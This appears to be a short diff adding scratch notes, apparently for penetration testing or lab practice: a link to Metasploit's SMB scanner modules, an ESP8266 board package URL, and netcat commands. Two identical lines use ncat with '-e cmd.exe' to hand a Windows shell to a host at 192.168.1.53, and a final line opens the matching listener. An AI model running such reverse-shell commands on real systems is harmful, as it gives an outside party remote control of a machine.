@@ -1,0 +1,10 @@
+
+https://github.com/rapid7/metasploit-framework/tree/master/modules/auxiliary/scanner/smb
+
+
+https://arduinoesp8266.com/stable/package_esp8266com_index.json
+
+ncat 192.168.1.53 4000 -e cmd.exe
+ncat 192.168.1.53 4000 -e cmd.exe
+
+nc -vlp 4000
